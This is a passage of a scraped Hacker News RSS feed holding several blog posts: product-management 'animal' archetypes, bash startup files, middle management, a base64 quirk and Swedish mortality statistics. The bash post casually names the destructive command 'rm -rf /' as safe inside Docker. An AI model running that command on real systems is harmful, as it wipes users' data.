<p>Read more about <a href="https://www.forbes.com/sites/derosetichy/2013/04/15/what-happens-when-a-hippo-runs-your-company/" target="_blank" rel="noopener">what happens when a HIPPO runs your company</a>.</p>
</div>
</div>
</div>
</div>
<h2>The WOLF – Working On the Latest Fire</h2>
<div>
<div>
<p>The WOLF has a short attention span and a temptation to jump from one problem to the next. They tend to only enjoy fighting fires, This will disrupt your team’s focus and effectiveness, making you easy prey for your competitors.</p>
<p>Create a process for collecting feedback about problems, bugs and only consider these along with all other requests. Set up triaging and set clear priorities and a method for prioritization.</p>
<p>There’s a whole book on WOLF prioritization: <a href="https://www.amazon.com/gp/product/1942788290/" target="_blank" rel="noopener">The Phoenix Project</a></p>
</div>
<div>
<figure><picture title="The four dangerous animals of product development 4">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/10/wolf.png.webp 484w, https://ochronus.online/wp-content/uploads/2020/10/wolf-300x300.png.webp 300w, https://ochronus.online/wp-content/uploads/2020/10/wolf-150x150.png.webp 150w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20484%20484'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 484px) 100vw, 484px">
<img width="484" height="484" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20484%20484'%3E%3C/svg%3E" alt="wolf - Working On the Latest Fire" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/10/wolf.png 484w, https://ochronus.online/wp-content/uploads/2020/10/wolf-300x300.png 300w, https://ochronus.online/wp-content/uploads/2020/10/wolf-150x150.png 150w" data-lazy-sizes="(max-width: 484px) 100vw, 484px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/10/wolf.png">
</picture>
</figure>
</div>
</div>
<h2>The RHINO – Really Here In Name Only</h2>
<div>
<div>
<figure><picture title="The four dangerous animals of product development 5">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/10/rhino.png.webp 478w, https://ochronus.online/wp-content/uploads/2020/10/rhino-300x300.png.webp 300w, https://ochronus.online/wp-content/uploads/2020/10/rhino-150x150.png.webp 150w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20478%20478'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 478px) 100vw, 478px">
<img width="478" height="478" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20478%20478'%3E%3C/svg%3E" alt="rhino - Reall Here In Name Only" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/10/rhino.png 478w, https://ochronus.online/wp-content/uploads/2020/10/rhino-300x300.png 300w, https://ochronus.online/wp-content/uploads/2020/10/rhino-150x150.png 150w" data-lazy-sizes="(max-width: 478px) 100vw, 478px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/10/rhino.png">
</picture>
</figure>
</div>
<div>
<p>The RHINO is just there to collect a paycheck without contributing much to the team. They might not be actively impeding your decision-making, but they are not helping much either. </p>
<p>Having a clearly defined prioritization process can help ensure all your team members understand how decisions are made and give them the confidence to actively participate. Hopefully, in this process, everyone is empowered to have a say and it doesn’t turn into “Well our process is that the boss tells you what’s important” – which is exactly how you end up with a team of disillusioned RHINOs.</p>
</div>
</div>
<h2>The ZEBRA – Zero Evidence But Really Arrogant</h2>
<div>
<div>
<p>ZEBRAs think they know it all but rely on their instinct rather than any actual evidence. To stave off the ZEBRAs in your midst, make sure that you’ve got data to back up your decisions.</p>
<p>Come up with quick experiments you can run to test ideas and gather evidence. Push for a data-driven culture.</p>
<p>An interesting article for the HIPPO vs. the ZEBRA: <a href="https://kromatic.com/blog/in-defense-of-the-hi-p-p-o/" target="_blank" rel="noopener">In defense of the HIPPO…fear the ZEBRA</a></p>
</div>
<div>
<figure><picture title="The four dangerous animals of product development 6">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/10/zebra.png.webp 484w, https://ochronus.online/wp-content/uploads/2020/10/zebra-300x300.png.webp 300w, https://ochronus.online/wp-content/uploads/2020/10/zebra-150x150.png.webp 150w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20484%20484'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 484px) 100vw, 484px">
<img width="484" height="484" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20484%20484'%3E%3C/svg%3E" alt="zebra - Zero Evindence But Really Aggressive" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/10/zebra.png 484w, https://ochronus.online/wp-content/uploads/2020/10/zebra-300x300.png 300w, https://ochronus.online/wp-content/uploads/2020/10/zebra-150x150.png 150w" data-lazy-sizes="(max-width: 484px) 100vw, 484px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/10/zebra.png">
</picture>
</figure>
</div>
</div>
<h2>And one extra…. the RHINO again! This time, Really High value New Opportunity</h2>
<p>Usually, it’s a salesperson with an amazing value customer deal for an unplanned feature insisting re-allocating resources to build what’s required to win the deal. The results, sadly, are an ignored strategy and roadmap and resources allocated to serve a single customer.</p>
<p>There are two ways here:</p>
<p>1, Chase the RHINO away: Compare the opportunity cost and value and argue against signing the deal if you have customer insight supporting the roadmap.<br>2, Tame the RHINO: Adjust the roadmap if the opportunity includes features you already had planned for later in the year.</p>
<p>Read more here: <a href="https://www.productfocus.com/taming-the-rhino/" target="_blank" rel="noopener">Taming the Rhino</a></p>

<p>There’s an amazing doc called <a href="https://www.productboard.com/wp-content/uploads/2020/09/The-Essential-Guide-to-Prioritization.pdf" target="_blank" rel="noopener">The Essential Guide to Prioritization</a> which explains the above with more context and more detail.</p>
<hr>
<h4>You might be interested in these posts, too:</h4>
<p><a href="https://ochronus.online/goal-setting/">The 101 of effective goal setting</a></p>
<p><a href="https://ochronus.online/learning-at-work-is-work/">Learning at work is absolutely work</a></p>
<p><a href="https://ochronus.online/how-to-stop-winning-arguments/">How to stop winning arguments</a></p>
<p><a href="https://ochronus.online/stories-we-tell-ourselves/">The stories we tell ourselves</a></p>


</div>
</div>

</article></div>]]>
            </description>
            <link>https://ochronus.online/four-dangerous-animals-of-product-development/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24880218</guid>
            <pubDate>Sat, 24 Oct 2020 16:34:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[/.bashrc VS –/.profile VS –/.bash_profile]]>
            </title>
            <description>
<![CDATA[
Score 128 | Comments 33 (<a href="https://news.ycombinator.com/item?id=24880170">thread link</a>) | @keyboardman
<br/>
October 24, 2020 | https://leimao.github.io/blog/bashrc-VS-profile-VS-bash_profile/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/bashrc-VS-profile-VS-bash_profile/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main">
  <div>
    
	<p><img src="https://leimao.github.io/images//author_images/Lei-Bio-Medium.jpg" alt="Lei Mao bio photo"></p><h3>Lei Mao</h3>
<p>Machine Learning, Artificial Intelligence, Computer Science.</p>
<p>

<a href="http://facebook.com/dukeleimao" target="_blank"><i></i> Facebook</a>
<a href="http://linkedin.com/in/lei-mao" target="_blank"><i></i> LinkedIn</a>


<a href="http://github.com/leimao" target="_blank"><i></i> GitHub</a>
<a href="http://scholar.google.com/citations?user=R2VUf7YAAAAJ" target="_blank"><i></i>&nbsp; G. Scholar</a>






<a href="mailto:dukeleimao@gmail.com" target="_blank"><i></i> E-Mail</a>

<a href="https://leimao.github.io/feed.xml" target="_blank"> RSS</a>
  </p></div>
  <article>
    <!--/ .headline-wrap -->
    <div>
      <h3 id="introduction">Introduction</h3>

<p>Sometimes, when I remotely login to some Linux computers or use Docker containers, I would find the shell is plain black and white, which is different from the colorful shell I used to deal with on my local machine. This is sometimes causing me trouble to look for libraries, executables, and folders. Sometimes, some executables could be called directly from a local shell but from a remotely login shell they are not directly callable.</p>



<p>It turns out that the shell is an executable and it is “configured” by special shell scripts such as <code>~/.bashrc</code>, <code>~/.profile</code>, <code>~/.bash_profile</code>. In this blog post, I would like to briefly discuss the differences between these scripts.</p>

<h3 id="bashrc">~/.bashrc</h3>

<p>I modify <code>~/.bashrc</code> file from time to time, because sometimes I would like to set some environment variables, including <code>PATH</code> which is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for executable files. But I have been ignoring its commented block at the beginning for decades.</p>

<div><div><pre><code>$ cat ~/.bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
...
</code></pre></div></div>

<p>This means that in a local shell, and if we use <code>bash</code>, this shell script will be executed immediately after <code>bash</code> is executed. There are many other shell executable variants, such as <code>zsh</code>. <code>~/.bashrc</code> is only specific to <code>bash</code>.</p>



<p>There are many code in the <code>~/.bashrc</code> that makes the shell looks colorful. For example,</p>

<div><div><pre><code># enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi
</code></pre></div></div>

<h3 id="profile">~/.profile</h3>

<p>The comment block from <code>~/.profile</code> explictly tells us that it will be executed for the login shells. However, if <code>~/.bash_profile</code> or <code>~/.bash_login</code> exists, <code>~/.profile</code> will not be executed.</p>

<div><div><pre><code>$ cat ~/.profile 
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
</code></pre></div></div>

<p>The default content of <code>~/.profile</code> is simple. Most likely, it inherits whatever there are in the <code>~/.bashrc</code>, and adds some user specific executable filepath to the environment variable <code>PATH</code>. So if there are commands that make the shell looks colorful in the <code>~/.bashrc</code>, the login shell should also look colorful.</p>

<h3 id="bash_profile">~/.bash_profile</h3>

<p>Unfortunately, in most of my login trials, the shells were never coloful, and sometimes the environment variables do not match my expectation. This is because there exists a <code>~/.bash_profile</code> therefore <code>~/.profile</code> or <code>~/.bashrc</code> is never executed. Usually the <code>~/.bash_profile</code> will be empty, this means that we would not have the environment and appearance as we have in our local shell.</p>



<p>To make the login shell “back to normal”, we could either delete the <code>~/.bash_profile</code> or modify the <code>~/.bash_profile</code> by adding some commands like</p>



<h3 id="caveats">Caveats</h3>

<p>Sometimes, a non-color shell could be helpful. It tells you that are not working in local shell. It could either be a Docker shell or a remote login shell. Knowing what shell we are dealing with, we would be less likely to do dangerous operations. For example, in a Docker shell, we could do almost anything, such as <code>rm -rf /</code> without sudo, without harming the local system.</p>

      <hr>
      
    </div><!-- /.article-wrap -->
  
    <!-- /#disqus_thread -->
  
  </article>
</div></div>]]>
            </description>
            <link>https://leimao.github.io/blog/bashrc-VS-profile-VS-bash_profile/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24880170</guid>
            <pubDate>Sat, 24 Oct 2020 16:28:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft Tilecode]]>
            </title>
            <description>
<![CDATA[
Score 399 | Comments 43 (<a href="https://news.ycombinator.com/item?id=24879861">thread link</a>) | @Impossible
<br/>
October 24, 2020 | https://microsoft.github.io/tilecode/ | <a href="https://web.archive.org/web/*/https://microsoft.github.io/tilecode/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://microsoft.github.io/tilecode/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24879861</guid>
            <pubDate>Sat, 24 Oct 2020 15:42:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Genghis, Graphs and Middle Management]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24879825">thread link</a>) | @neophocion
<br/>
October 24, 2020 | https://middle-out.io/posts/genghis | <a href="https://web.archive.org/web/*/https://middle-out.io/posts/genghis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>You’re a developer working on the Foobar feature at company X. Unbeknownst to you, Genghis, the company CEO, just had dinner with other industry leaders and became excited about this new thing called Beezlyboo. Genghis mentions his excitement at Thursday’s executive council meeting, with the company’s top layer of middle management listening in.</p><p>Mandukhai, the middle manager two layers above you, was present. She conveys the takeaways in her regular Friday morning coffee catchup with the managers that report to her, including the Foobar team lead, your boss, Subotai.</p><p>Fighting for relevance after a bumpy year, Subotai grows convinced that working on this Beezlyboo thing might be his ticket back into Mandukhai's good graces.</p><p>You enter the office on Monday morning, unsheathe your sword, and balance it carefully on top of your monitor before sitting down and getting to work. <i>Little do you know that two weeks from now, half your time will be spent on this new thing called Beezlyboo.</i></p><div><h3>How Middle Management Emerges</h3><p>This is an unfortunately common description of how decisions are made in many of today’s <del>Khanates</del> companies. Why is that? Let’s take a look at how communication and decision making evolve as companies grow larger.</p><p>Here’s how many companies begin: <br><img src="https://middle-out.io/images/genghis/2company.png" alt="2 people companies"></p><p>Two founders, working closely to get their new startup off the ground.</p><p>A more mature company might look more like this:<br><img src="https://middle-out.io/images/genghis/k3company.png" alt="Small company"></p><p>That’s Google circa 1999. Individuals hold increasingly defined roles. Management and process are beginning to creep in, but all anyone really wants to do is get on with things, management be damned. Grabbing a colleague to discuss something is as easy as shouting across the office.</p><p>But as companies grow larger, the majority end up looking more like this:<img src="https://middle-out.io/images/genghis/3comp.png" alt="Large company"></p><p>This is of course an over-simplification as every organization maintains informal networks, cross-functional teams, and parallel networks. But it is a useful representation to understand how hierarchies simplify the sharing of information by creating highways for it. Additionally, we will assume that every team operates in a mesh (even if we were not skilled enough to draw those relations).</p><p>See those ‘o’ nodes? That’s middle management. Layers and layers of it. Its main purpose is to simplify decision making and communication by concentrating ownership of different parts of the business in the hands of a select few.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>For the more mathematically inclined, middle management splits the previously shown complete graphs with <span><span><span><math><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub><mo>=</mo><mfrac><mrow><mi>n</mi><mo>(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo>)</mo></mrow><mrow><mn>2</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">K_n = \frac{n(n-1)}{2}</annotation></semantics></math></span></span></span> edges into multiple complete subgraphs with <span><span><span><math><semantics><mrow><msub><mi>M</mi><mi>n</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msub><mi>K</mi><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">M_n = \sum_i^nK_{m(i)+1}</annotation></semantics></math></span></span></span> edges, where <span><span><span><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></span></span> runs over managers and <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">m(i)</annotation></semantics></math></span></span></span> is the number of people they manage. We assume that reporting edges correspond to lines of communication and that members of a team are fully connected in complete graphs.</p></div></d-figure></figure><p>The benefits are clear. When CEO Genghis or Kublai, another middle manager, want to figure out what’s going on with the Foobar team (highlighted above in Millenial pink), all they need do is call Subotai. By concentrating ownership of Foobar in Subotai’s hands, his team is shielded from unnecessary communication, allowing them to focus on their work.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>To illustrate: <span><span><span><math><semantics><mrow><msub><mi>K</mi><mrow><mn>5</mn><mn>0</mn><mn>0</mn><mn>0</mn></mrow></msub><mo>=</mo><mn>1</mn><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mn>9</mn><mn>7</mn><mo separator="true">,</mo><mn>5</mn><mn>0</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">K_{5000} = 12,497,500</annotation></semantics></math></span></span></span>, but introducing 556 managers<sup>1</sup> each with <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>=</mo><mn>1</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">m(i) = 10</annotation></semantics></math></span></span></span> reports gives <span><span><span><math><semantics><mrow><msub><mi>M</mi><mrow><mn>5</mn><mn>5</mn><mn>6</mn></mrow></msub><mo>=</mo><mn>3</mn><mn>0</mn><mo separator="true">,</mo><mn>5</mn><mn>8</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">M_{556} = 30,580</annotation></semantics></math></span></span></span>. That's only <span><span><span><math><semantics><mrow><mn>0</mn><mi mathvariant="normal">.</mi><mn>2</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">0.2\%</annotation></semantics></math></span></span></span> of the original and a radically simpler org structure! </p></div></d-figure></figure><p>But there's also an obvious downside: poor decision making. While the ‘x’ nodes focus on the work at hand, the ‘o’ nodes are busy talking and aligning amongst themselves. This creates two problems: the ‘o’s lose touch with the actual work being done, while the ‘x’s cannot easily see, communicate, or influence beyond team boundaries. Which, remember, is why you’ll be surprised when Beezlyboo lands on your desk in two weeks' time.</p><h3>What Companies Are Doing About This Today</h3><p>So far we've been talking about idealized companies. In reality, there are informal networks that permeate company hierarchies. There are also good and bad ‘x’s and ‘o’s. We know a lot about what a good ‘o’ is (or should be). There’s an <a href="https://www.forbes.com/sites/vickyvalet/2019/03/19/americas-best-management-consulting-firms-2019/#656906003d00">entire industry out there dedicated to this</a>, complete with degrees (MBAs) and reading material (those management books you tend to find in airport bookshops).</p><p>One thing ‘o’s obsess over is how best to organize things, which is great. That's their job, after all. The problem is that their solutions are often clunky. Do any of these sound familiar?</p><ul><li><b>Culture stuff:</b> the ‘o’s realize the company’s formal and informal hierarchies are too strong, so they begin promoting things like guilds, societies, team building activities, random coffee catchups between senior leads and juniors, etc.</li><li><b>Reorgs:</b> featuring endless tweaks to the traditional hierarchical org structure (functional, divisional, matrix/cross-functional… you name it). Ironically, it’s the ‘o’s that instigate these —  often to the complete bewilderment of the ‘x’s.</li><li><b>Surveys:</b> because making the ‘x’s click through an annoying ten-page annual survey is a great way of discovering how they really feel. Right? Right. </li></ul><p>If these solutions sound drab and disengaging, it's because they are. <a href="https://en.wikipedia.org/wiki/Ronald_Coase">Ronald Coase</a>, the 1991 Nobel laureate in economics, published an <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x">influential essay in 1937</a> on why firms even appear, and mentions that the benefits of larger firms are quickly outweighed by the overheads of maintaining their complex hierarchies and the misallocations of resources which stem from this. In a more modern work, Gary Hammel and Michele Zanini demonstrate in <a href="https://www.humanocracy.com/">Humanocracy</a> -- another one of those airport books -- that:                </p><p>A <a href="https://www.gallup.com/workplace/236552/managers-engaged-jobs.aspx">2018 Gallup study</a> found two-thirds of US employees and 51 percent of US managers to be disengaged at work.</p><p>In 2018, there were 146 million employees in the US workforce. [...] Of these, 20.5 million were managers and supervisors. In addition, there were 6.4 million employed in administrative support functions. In total, then, the bureaucratic class comprises 26.9 million individuals or 18.4 percent of the US workforce. [...] claiming more than $3.2 trillion in compensation, or nearly a third of America’s total wage bill.</p><p>They argue that, if we could repurpose a fraction of this managerial bloat into more productive pursuits, we would free up a lot of unproductive excess wages and therefore raise productivity, overall compensation (for the rest of us), and employee engagement.</p><p><b>Genghis:</b> Okay, kiddo, that's great... but we're trying to run a Khanate company that stretches from eastern Europe to China. Maybe our team building activities are a little boring, and we do like a good reorg, especially after we invade acquire a new company, but what are you proposing? That we fire all our generals and officers and turn into those Valve hippies? <br><b>Ogedei (You):</b> Not at all. Hear me out.</p><h3>What the Future Might Look Like</h3><p>With everyone and <a href="https://www.itv.com/news/wales/2020-03-19/people-stuck-at-home-are-sharing-pictures-of-their-cat-and-dog-coworkers">their cat</a> — not to mention the <a href="https://www.oecd.org/future-of-work/">OECD</a> — talking about the Future of Work these days, isn’t it time we began trying to tackle company organization with more pizazz? You know, just throw some tech and AI at it.</p><p><b>Genghis:</b> Oh god, here we go again with your AI thing.<br></p><p>He's right: here we go.<sup>2</sup> One of the most significant transformations due to play out over the next decade is the <a href="https://www.cnbc.com/2019/06/20/slack-ceo-predicts-end-of-company-email-as-we-know-it-in-7-years.html">death of email</a> in within-company communications and its replacement by tools like Slack and Teams. Not only do Slack and Teams introduce a new medium for companies to communicate in, they also allow for modern third-party integrations via their APIs. That’s something email tools like Gmail or Outlook never quite got right.</p><p>On top of this, there's an unfolding generational shift. Millennials will continue to graduate to positions of power as the 2020s progress — and they’ve grown up using online chat protocols and social networks.</p><p><b>Ogedei:</b> So here’s the thing, Dad. The way we organize ourselves in companies will change because young people like me communicate in new and different ways.</p><p>The first wave of startups attempting to tackle this — like <a href="https://knowyourteam.com/">Know Your Team (KYT)</a>, <a href="https://www.ally.io/">Ally</a>, <a href="https://lattice.com/">Lattice</a>, <a href="https://www.donut.com/">Donut</a>, <a href="https://withcadence.io/">Cadence</a>, and a handful of others — are already well on their way.</p><p>Let's take KYT as an example. It's a fantastic tool that takes the magic of being a good 'o' and pours it into a suite of effective communication tools to help you manage your reports. Backed by years of research and a kick-ass CEO in <a href="https://clairelew.com/">Claire Lew</a>, KYT is a great example of a company pushing the envelope of how we think about management.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><div><p>If middle managers in today’s corporations are obsessed with airport books and ways of organizing people, then the true organizational geeks are military commanders and theorists. Organizing militaries has been a thing since time immemorial, from <a href="https://en.wikipedia.org/wiki/Sun_Tzu">Sun Tzu</a> to <a href="https://en.wikipedia.org/wiki/Carl_von_Clausewitz">Clausewitz</a>.<sup>3</sup></p><p>The Mongols weren’t too shabby either. Instead of Slack, they used a system of postal relays called <a href="https://en.wikipedia.org/wiki/Yam_(route)">Yam</a>. Instead of executive councils, they had <a href="https://en.wikipedia.org/wiki/Kurultai">Kurultais</a>. The Mongols adapted quickly and <a href="https://en.wikipedia.org/wiki/Religion_in_the_Mongol_Empire">didn't try to change the religious habits of conquered populations</a>. By virtue of necessity, they also had a <a href="https://www.britannica.com/place/Mongol-empire/Organization-of-Genghis-Khans-empire">pretty devolved leadership structure</a> — individual Khans ruled parts of the empire which were thousands of miles apart. We could learn a lot about how management can be done better from the Mongols.<sup>4</sup></p></div></div></d-figure></figure><h3>Rethinking How We Organize</h3><p>So if fully connected graphs don't scale, and if tight hierarchies are inefficient and soul-crushing, what else is there?</p><p>Say you're a middle manager. You report to someone, a few others report to you. A good chunk of your time is spent synthesizing information (mostly updates) flowing across your node in the graph, from the top down and from the bottom up. </p><p>This is where we come in. At Middle Out, we're working on a solution that analyses user conversations, summarizes important segments into updates, and proposes these updates to users for final editing and approval before making them visible to the rest of the company. We then take these updates and show each user the ones our model believes are most useful to them. This is tantamount to getting rid of the fog-of-war that shrouds parts of any company from individual employees. In short, you'd see Beezlyboo coming a mile away. </p><figure><d-figure id="boldify"><div svelte-1667065745=""><div><p>Why did this not exist before? Why do people still update each other …</p></div></div></d-figure></figure></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://middle-out.io/posts/genghis">https://middle-out.io/posts/genghis</a></em></p>]]>
            </description>
            <link>https://middle-out.io/posts/genghis</link>
            <guid isPermaLink="false">hacker-news-small-sites-24879825</guid>
            <pubDate>Sat, 24 Oct 2020 15:37:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA['changeme' is valid base64]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 24 (<a href="https://news.ycombinator.com/item?id=24879062">thread link</a>) | @todsacerdoti
<br/>
October 24, 2020 | https://blog.3fx.ch/post/changeme-base64/ | <a href="https://web.archive.org/web/*/https://blog.3fx.ch/post/changeme-base64/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
        <header>
            
        </header>

        


        <p><a href="https://en.wikipedia.org/wiki/Base64">Base64-encoding</a> is ubiquitous in our
modern world. Many programs communicate in base64-encoded messages, since these
have nice properties: They consist of a very limited subset of ASCII characters,
and can thus be displayed as text. E-Mails for example are commonly encoded in
base64 in transfer, which can be seen in the <code>Content-Transfer-Encoding</code> header.</p>

<p>Where I volunteer we have a tradition of putting <code>changeme</code> as a placeholder for
many template variables indicating that they should be overwritten later. Thus,
if we later still see <code>changeme</code> anywhere we know that somewhere somebody must
have forgotten to specify a variable<sup id="fnref:1"><a href="#fn:1">1</a></sup>.</p>

<p>Sometimes these template variables should correspond to base64-encoded content,
i.e. the base64-decoding of said variable should produce meaningful content. But
what happens if somebody forgets to define said variable, and it is substituted
with<code>changeme</code> instead? I always thought that it would fail to
decode the string since the probability that <code>changeme</code> is actually valid base64
encoding must be very low. But lo and behold, this is not the case:</p>

<pre><code>% echo changeme | base64 -d
r�[1m
</code></pre>

<p>Running <code>hexdump</code> on the output we can identify the characters:</p>

<pre><code>% echo changeme | base64 -d | hexdump -C
00000000  72 16 a7 81 e9 9e      |r.....|
00000006
</code></pre>

<p>Mostly nonsense, but the second byte is interesting: It is an ASCII control
character <sup id="fnref:2"><a href="#fn:2">2</a></sup>, meaning trips up all sorts of programs which expect to read
printable ASCII characters, such as JSON deserializers.</p>

<p>This bug actually occurred when I was migrating some applications between
different Kubernetes clusters: In the old cluster the application ran without
problems, but I forgot to specify some variable in the new cluster, and it lead
to Go complaining about non-ASCII characters in a JSON string.</p>

<p>I guess the moral of the story is: If you use dummy values be sure that they
cannot be misinterpreted.</p>



        
    </article>
</div></div>]]>
            </description>
            <link>https://blog.3fx.ch/post/changeme-base64/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24879062</guid>
            <pubDate>Sat, 24 Oct 2020 13:24:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[September 2020 least deadly month ever in Sweden]]>
            </title>
            <description>
<![CDATA[
Score 129 | Comments 132 (<a href="https://news.ycombinator.com/item?id=24878723">thread link</a>) | @ptr
<br/>
October 24, 2020 | https://cornucopia.cornubot.se/2020/10/september-2020-least-deadly-month-ever.html?m=1 | <a href="https://web.archive.org/web/*/https://cornucopia.cornubot.se/2020/10/september-2020-least-deadly-month-ever.html?m=1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-2414610535484946156" itemprop="articleBody"><p>
According to the state authority Statistics Sweden (SCB) data, september 2020 was the least deadly month per capita ever in Swedish history. So far the year 2020 has been the third least deadly year per capita ever in the country, despite the tragic and global Covid-19 pandemic.</p><table><tbody><tr><td><a href="https://1.bp.blogspot.com/-9FFnIABbac4/X5Pw8Wo0YFI/AAAAAAABB58/SHSv6ZYjdD0Vz6mP10Bp1YI3UlnpY_zBwCLcBGAsYHQ/s2048/1.png"><img data-original-height="1176" data-original-width="2048" height="160" src="https://1.bp.blogspot.com/-9FFnIABbac4/X5Pw8Wo0YFI/AAAAAAABB58/SHSv6ZYjdD0Vz6mP10Bp1YI3UlnpY_zBwCLcBGAsYHQ/w640-h366/1.png" width="280"></a></td></tr><tr><td>Deaths in September 1860 - 2020 in Sweden per 100 000 population. Data: SCB</td></tr></tbody></table><div><p>September 2020 was the least deadly month ever in Sweden, at least so far back as the data from SCB:s public database provides data. There were 63.07 deaths per 100 000 people in September 2020, and the previous record low was 64.24 in June 2019, and before that 65.13 in June 2018.</p><div><div><p>For the year 2020 so far, ie January - September, the number of deaths per capita is the third lowest ever.</p><table><tbody><tr><td><a href="https://1.bp.blogspot.com/-0S5HrrSJ-u4/X5Pw8Yv4K1I/AAAAAAABB6A/-sEnWALKjRAJy_5Z6GM4xDDZsYzg1QhFACLcBGAsYHQ/s2048/2.png"><img data-original-height="1176" data-original-width="2048" height="160" src="https://1.bp.blogspot.com/-0S5HrrSJ-u4/X5Pw8Yv4K1I/AAAAAAABB6A/-sEnWALKjRAJy_5Z6GM4xDDZsYzg1QhFACLcBGAsYHQ/w640-h366/2.png" width="280"></a></td></tr><tr><td>Deaths January - September 1860 - 2020 in Sweden per 100 000 population. Data: SCB</td></tr></tbody></table><br></div></div></div><p>The number of deaths per 100 000 population in Sweden was 675 for January - September 2020. 2019 January - September have the record low at 636 and 2016 had the record before that at &nbsp;673. Data sources are the same as above.</p><p><b>Both 2017 and 2018 had a higher numer of deaths per capita January - September than Sweden have had for the same months in 2020, despite the Covid-19 pandemic.</b></p><p>Possible confounding factors might be demographic mix. However, the average age in Sweden (<a href="https://www.statistikdatabasen.scb.se/pxweb/sv/ssd/START__BE__BE0101__BE0101B/BefolkningMedelAlder/">SCB database table</a>) was 41.1 years in 2011, and had a plateau at 41.2 for the years 2012 - 2018, and increased to 41.3 years in 2019, so the average population age is increasing. There is no data for 2020 yet.&nbsp;</p><p><i>I am not an epidemiologist. It is not up to me to draw conclusions from this. The numbers above are simple facts, based on the high quality official statistics. My only merit is running the independent blog in economics and politics in Sweden with the highest traffic since the start 2008, and being used to crunch official statistics and data. As my Swedish language article on the subject got some international attention, I have published this article in bad English.</i></p><p><i>New visitors will be unable to comment, as my moderator robot deletes any 